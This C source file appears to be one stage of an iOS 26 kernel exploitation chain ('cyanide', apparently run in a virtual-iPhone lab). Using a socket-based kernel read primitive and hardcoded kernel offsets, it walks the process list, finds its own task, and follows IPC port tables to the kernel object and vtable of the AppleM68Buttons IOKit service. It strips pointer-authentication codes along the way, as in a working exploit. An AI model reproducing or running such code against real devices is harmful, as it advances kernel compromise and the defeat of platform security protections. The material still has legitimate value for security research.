#include "CNDLabKernelProtocol.h"

#include <dlfcn.h>
#include <errno.h>
#include <inttypes.h>
#include <mach/mach.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

/* Exact iOS 26.0 23A341 vPhone layout. */
static const uint64_t kStaticAllProc = UINT64_C(0xfffffe0009813020);
static const uint64_t kStaticM68SetPowerState =
    UINT64_C(0xfffffe0008611dbc);
static const uint64_t kZoneMin = UINT64_C(0xfffffe1000000000);
static const uint64_t kZoneMax = UINT64_C(0xfffffe3fffffffff);
static const uint64_t kProcROOffset = UINT64_C(0x18);
static const uint64_t kProcPIDOffset = UINT64_C(0x60);
static const uint64_t kProcROTaskOffset = UINT64_C(0x8);
static const uint64_t kTaskIPCSpaceOffset = UINT64_C(0x310);
static const uint64_t kIPCSpaceTableOffset = UINT64_C(0x48);
static const uint64_t kIPCEntrySize = UINT64_C(0x18);
static const uint64_t kPortKobjectOffset = UINT64_C(0x50);
static const uint64_t kPortKobjectInnerOffset = UINT64_C(0x20);
static const uint64_t kSetPowerStateVtableOffset = UINT64_C(0x4d8);
static const uint64_t kM68EventSourceOffset = UINT64_C(0x1f8);

typedef mach_port_t CNDIOObject;
typedef CNDIOObject CNDIOIterator;
typedef CNDIOObject CNDIOService;
typedef void *(*CNDIOServiceMatchingFn)(const char *name);
typedef kern_return_t (*CNDIOServiceGetMatchingServicesFn)(
    mach_port_t main_port, void *matching, CNDIOIterator *iterator);
typedef CNDIOObject (*CNDIOIteratorNextFn)(CNDIOIterator iterator);
typedef kern_return_t (*CNDIOObjectReleaseFn)(CNDIOObject object);

static uint64_t gLastRawSpace;
static uint64_t gLastSpace;
static uint64_t gLastRawTable;
static uint64_t gLastTable;
static uint64_t gLastEntry;
static uint64_t gLastRawPortObject;

static int transfer_all(int fd, void *buffer, size_t size, int writing)
{
    unsigned char *cursor = buffer;
    while (size != 0) {
        ssize_t amount = writing
            ? write(fd, cursor, size) : read(fd, cursor, size);
        if (amount == 0) return ECONNRESET;
        if (amount < 0) {
            if (errno == EINTR) continue;
            return errno != 0 ? errno : EIO;
        }
        cursor += (size_t)amount;
        size -= (size_t)amount;
    }
    return 0;
}

static int request(int fd, uint32_t operation, uint64_t address,
                   void *buffer, size_t length, uint64_t *value)
{
    CNDLabKRWRequest message = {
        .magic = CND_LAB_KRW_MAGIC,
        .version = CND_LAB_KRW_VERSION,
        .operation = operation,
        .length = (uint32_t)length,
        .address = address,
    };
    int result = transfer_all(fd, &message, sizeof(message), 1);
    CNDLabKRWResponse response = {0};
    if (result == 0) result = transfer_all(fd, &response, sizeof(response), 0);
    if (result == 0 && (response.magic != CND_LAB_KRW_MAGIC ||
        response.status != 0 ||
        (operation == CNDLabKRWOperationRead && response.length != length))) {
        result = response.status != 0 ? response.status : EPROTO;
    }
    if (result == 0 && operation == CNDLabKRWOperationRead && length != 0) {
        result = transfer_all(fd, buffer, length, 0);
    }
    if (result == 0 && value != NULL) *value = response.value;
    return result;
}

static int kernel_read(int fd, uint64_t address, void *buffer, size_t length)
{
    unsigned char *cursor = buffer;
    while (length != 0) {
        size_t amount = length > CND_LAB_KRW_MAX_TRANSFER
            ? CND_LAB_KRW_MAX_TRANSFER : length;
        int result = request(fd, CNDLabKRWOperationRead, address,
                             cursor, amount, NULL);
        if (result != 0) return result;
        address += amount;
        cursor += amount;
        length -= amount;
    }
    return 0;
}

__attribute__((naked))
static uint64_t strip_data_pointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}

__attribute__((naked))
static uint64_t strip_instruction_pointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac143e0"); /* xpaci x0 */
    __asm__ volatile("ret");
}

static int kernel_object(uint64_t value)
{
    return value >= kZoneMin && value <= kZoneMax && (value & 7) == 0;
}

static int kernel_static(uint64_t value)
{
    return (value & UINT64_C(0xffff000000000000)) ==
        UINT64_C(0xffff000000000000);
}

static int read_pointer(int fd, uint64_t address, uint64_t *raw_out,
                        uint64_t *pointer_out, int require_object)
{
    uint64_t raw = 0;
    int result = kernel_read(fd, address, &raw, sizeof(raw));
    uint64_t pointer = strip_data_pointer(raw);
    if (raw_out != NULL) *raw_out = raw;
    if (pointer_out != NULL) *pointer_out = pointer;
    if (result != 0) return result;
    return (require_object ? kernel_object(pointer) : kernel_static(pointer))
        ? 0 : EILSEQ;
}

static uint64_t find_process(int fd, uint64_t head, uint32_t wanted_pid,
                             uint32_t *visited_out)
{
    uint64_t process = strip_data_pointer(head);
    uint32_t visited = 0;
    for (; visited < 1024 && kernel_object(process); visited++) {
        unsigned char header[0x64] = {0};
        if (kernel_read(fd, process, header, sizeof(header)) != 0) break;
        uint32_t pid = 0;
        memcpy(&pid, header + kProcPIDOffset, sizeof(pid));
        if (pid == wanted_pid) {
            if (visited_out != NULL) *visited_out = visited + 1;
            return process;
        }
        uint64_t raw_next = 0;
        memcpy(&raw_next, header, sizeof(raw_next));
        uint64_t next = strip_data_pointer(raw_next);
        if (next == process) break;
        process = next;
    }
    if (visited_out != NULL) *visited_out = visited;
    return 0;
}

static uint64_t task_for_process(int fd, uint64_t process)
{
    uint64_t proc_ro = 0;
    uint64_t task = 0;
    if (read_pointer(fd, process + kProcROOffset, NULL, &proc_ro, 1) != 0 ||
        read_pointer(fd, proc_ro + kProcROTaskOffset,
                     NULL, &task, 1) != 0) {
        return 0;
    }
    return task;
}

static uint64_t port_object(int fd, uint64_t task, mach_port_name_t name)
{
    uint64_t space = 0;
    if (read_pointer(fd, task + kTaskIPCSpaceOffset,
                     &gLastRawSpace, &space, 1) != 0) return 0;
    gLastSpace = space;
    uint64_t raw_table = 0;
    if (kernel_read(fd, space + kIPCSpaceTableOffset,
                    &raw_table, sizeof(raw_table)) != 0) return 0;
    gLastRawTable = raw_table;
    uint64_t table = strip_data_pointer(raw_table) & ~UINT64_C(0x1f);
    gLastTable = table;
    uint64_t index = (uint64_t)name >> 8;
    if (!kernel_object(table) || index > (UINT64_MAX - table) / kIPCEntrySize) {
        return 0;
    }
    gLastEntry = table + index * kIPCEntrySize;
    uint64_t object = 0;
    if (read_pointer(fd, gLastEntry,
                     &gLastRawPortObject, &object, 1) != 0) return 0;
    return object;
}

static int parse_u64(const char *text, uint64_t *value)
{
    if (text == NULL || value == NULL || text[0] == '\0' || text[0] == '-') {
        return EINVAL;
    }
    errno = 0;
    char *end = NULL;
    unsigned long long parsed = strtoull(text, &end, 0);
    if (errno != 0 || end == text || *end != '\0') return EINVAL;
    *value = (uint64_t)parsed;
    return 0;
}

static int connect_provider(const char *path)
{
    if (path == NULL || strlen(path) >=
        sizeof(((struct sockaddr_un *)0)->sun_path)) {
        errno = EINVAL;
        return -1;
    }
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_un address = { .sun_family = AF_UNIX };
    strcpy(address.sun_path, path);
    if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    return fd;
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(stderr, "usage: %s PROVIDER_SOCKET EXPECTED_BASE SLIDE\n",
                argv[0]);
        return 64;
    }
    uint64_t expected_base = 0;
    uint64_t slide = 0;
    if (parse_u64(argv[2], &expected_base) != 0 ||
        parse_u64(argv[3], &slide) != 0 ||
        !kernel_static(expected_base) || slide >= UINT64_C(0x100000000)) {
        fprintf(stderr, "invalid expected base or slide\n");
        return 64;
    }

    int fd = connect_provider(argv[1]);
    if (fd < 0) {
        fprintf(stderr, "provider connect failed: %s\n", strerror(errno));
        return 1;
    }
    uint64_t capabilities = 0;
    uint64_t base = 0;
    int result = request(fd, CNDLabKRWOperationCapabilities,
                         0, NULL, 0, &capabilities);
    if (result == 0) {
        result = request(fd, CNDLabKRWOperationKBase, 0, NULL, 0, &base);
    }
    if (result != 0 || base != expected_base ||
        (capabilities & CNDLabKRWCapabilityKernelReadWrite) == 0) {
        fprintf(stderr,
                "provider identity failed result=%d base=%#" PRIx64
                " expected=%#" PRIx64 " capabilities=%#" PRIx64 "\n",
                result, base, expected_base, capabilities);
        close(fd);
        return 2;
    }

    uint64_t allproc_head = 0;
    result = kernel_read(fd, kStaticAllProc + slide,
                         &allproc_head, sizeof(allproc_head));
    uint32_t visited = 0;
    uint64_t process = result == 0
        ? find_process(fd, allproc_head, (uint32_t)getpid(), &visited) : 0;
    uint64_t task = process != 0 ? task_for_process(fd, process) : 0;
    if (!kernel_object(process) || !kernel_object(task)) {
        fprintf(stderr,
                "self task resolution failed result=%d visited=%u process=%#"
                PRIx64 " task=%#" PRIx64 "\n",
                result, visited, process, task);
        close(fd);
        return 3;
    }

    void *iokit = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_NOW | RTLD_LOCAL);
    CNDIOServiceMatchingFn matching_fn = iokit != NULL
        ? (CNDIOServiceMatchingFn)dlsym(iokit, "IOServiceMatching") : NULL;
    CNDIOServiceGetMatchingServicesFn services_fn = iokit != NULL
        ? (CNDIOServiceGetMatchingServicesFn)dlsym(
            iokit, "IOServiceGetMatchingServices") : NULL;
    CNDIOIteratorNextFn next_fn = iokit != NULL
        ? (CNDIOIteratorNextFn)dlsym(iokit, "IOIteratorNext") : NULL;
    CNDIOObjectReleaseFn release_fn = iokit != NULL
        ? (CNDIOObjectReleaseFn)dlsym(iokit, "IOObjectRelease") : NULL;
    if (matching_fn == NULL || services_fn == NULL ||
        next_fn == NULL || release_fn == NULL) {
        fprintf(stderr, "IOKit symbol resolution failed\n");
        if (iokit != NULL) dlclose(iokit);
        close(fd);
        return 4;
    }

    void *matching = matching_fn("AppleM68Buttons");
    CNDIOIterator iterator = MACH_PORT_NULL;
    kern_return_t kr = matching != NULL
        ? services_fn(MACH_PORT_NULL, matching, &iterator) : KERN_FAILURE;
    uint64_t expected_method = kStaticM68SetPowerState + slide;
    CNDIOService selected_service = MACH_PORT_NULL;
    uint64_t selected_port = 0;
    uint64_t selected_wrapper = 0;
    uint64_t selected_object = 0;
    uint64_t selected_raw_vtable = 0;
    uint64_t selected_vtable = 0;
    uint64_t selected_raw_method = 0;
    uint64_t selected_method = 0;
    uint32_t candidate_count = 0;
    CNDIOService last_service = MACH_PORT_NULL;
    uint64_t last_port = 0;
    uint64_t last_wrapper = 0;
    uint64_t last_object = 0;
    uint64_t last_vtable = 0;
    uint64_t last_method = 0;
    if (kr == KERN_SUCCESS && MACH_PORT_VALID(iterator)) {
        for (uint32_t index = 0; index < 128; index++) {
            CNDIOService service = next_fn(iterator);
            if (!MACH_PORT_VALID(service)) break;
            candidate_count++;
            uint64_t port = port_object(fd, task, service);
            uint64_t wrapper = 0;
            uint64_t object = 0;
            uint64_t raw_vtable = 0;
            uint64_t vtable = 0;
            uint64_t raw_method = 0;
            int exact = kernel_object(port) &&
                read_pointer(fd, port + kPortKobjectOffset,
                             NULL, &wrapper, 1) == 0 &&
                read_pointer(fd, wrapper + kPortKobjectInnerOffset,
                             NULL, &object, 1) == 0 &&
                kernel_read(fd, object,
                            &raw_vtable, sizeof(raw_vtable)) == 0;
            if (exact) {
                vtable = strip_data_pointer(raw_vtable);
                exact = kernel_static(vtable) &&
                    kernel_read(fd, vtable + kSetPowerStateVtableOffset,
                                &raw_method, sizeof(raw_method)) == 0;
            }
            uint64_t method = strip_instruction_pointer(raw_method);
            last_service = service;
            last_port = port;
            last_wrapper = wrapper;
            last_object = object;
            last_vtable = vtable;
            last_method = method;
            exact = exact && method == expected_method &&
                raw_vtable != vtable && raw_method != method;
            if (exact) {
                selected_service = service;
                selected_port = port;
                selected_wrapper = wrapper;
                selected_object = object;
                selected_raw_vtable = raw_vtable;
                selected_vtable = vtable;
                selected_raw_method = raw_method;
                selected_method = method;
                break;
            }
            release_fn(service);
        }
        release_fn(iterator);
    }

    uint64_t raw_event_source = 0;
    uint64_t event_source = 0;
    if (!kernel_object(selected_object) ||
        kernel_read(fd, selected_object + kM68EventSourceOffset,
                    &raw_event_source, sizeof(raw_event_source)) != 0) {
        event_source = 0;
    } else {
        event_source = strip_data_pointer(raw_event_source);
        if (!kernel_object(event_source)) event_source = 0;
    }

    printf("{\"schema\":\"com.zeroxjf.cyanide.m68-live-resolve\","
           "\"schemaVersion\":1,\"kernelBase\":\"%#" PRIx64 "\","
           "\"slide\":\"%#" PRIx64 "\",\"pid\":%d,"
           "\"procWalkCount\":%u,\"selfProc\":\"%#" PRIx64 "\","
           "\"selfTask\":\"%#" PRIx64 "\",\"servicePort\":%u,"
           "\"ipcPort\":\"%#" PRIx64 "\",\"wrapper\":\"%#" PRIx64 "\","
           "\"object\":\"%#" PRIx64 "\",\"rawVtable\":\"%#" PRIx64 "\","
           "\"vtable\":\"%#" PRIx64 "\",\"rawSetPowerState\":\"%#" PRIx64 "\","
           "\"setPowerState\":\"%#" PRIx64 "\","
           "\"expectedSetPowerState\":\"%#" PRIx64 "\","
           "\"matchingKR\":%d,\"iterator\":%u,"
           "\"candidateCount\":%u,\"lastServicePort\":%u,"
           "\"lastIPCPort\":\"%#" PRIx64 "\","
           "\"lastWrapper\":\"%#" PRIx64 "\","
           "\"lastObject\":\"%#" PRIx64 "\","
           "\"lastVtable\":\"%#" PRIx64 "\","
           "\"lastSetPowerState\":\"%#" PRIx64 "\","
           "\"rawIPCSpace\":\"%#" PRIx64 "\","
           "\"ipcSpace\":\"%#" PRIx64 "\","
           "\"rawIPCTable\":\"%#" PRIx64 "\","
           "\"ipcTable\":\"%#" PRIx64 "\","
           "\"ipcEntry\":\"%#" PRIx64 "\","
           "\"rawIPCPort\":\"%#" PRIx64 "\","
           "\"eventSourceSlot\":\"%#" PRIx64 "\","
           "\"rawEventSource\":\"%#" PRIx64 "\","
           "\"eventSource\":\"%#" PRIx64 "\","
           "\"exactLiveObject\":%s,\"usedKernelWrite\":false,"
           "\"usedKernelCall\":false}\n",
           base, slide, getpid(), visited, process, task,
           selected_service, selected_port, selected_wrapper, selected_object,
           selected_raw_vtable, selected_vtable, selected_raw_method,
           selected_method, expected_method,
           kr, iterator, candidate_count, last_service, last_port,
           last_wrapper, last_object, last_vtable, last_method,
           gLastRawSpace, gLastSpace, gLastRawTable, gLastTable,
           gLastEntry, gLastRawPortObject,
           selected_object + kM68EventSourceOffset,
           raw_event_source, event_source,
           kernel_object(selected_object) && kernel_object(event_source)
               ? "true" : "false");

    if (MACH_PORT_VALID(selected_service)) release_fn(selected_service);
    dlclose(iokit);
    close(fd);
    return kernel_object(selected_object) && kernel_object(event_source) ? 0 : 5;
}
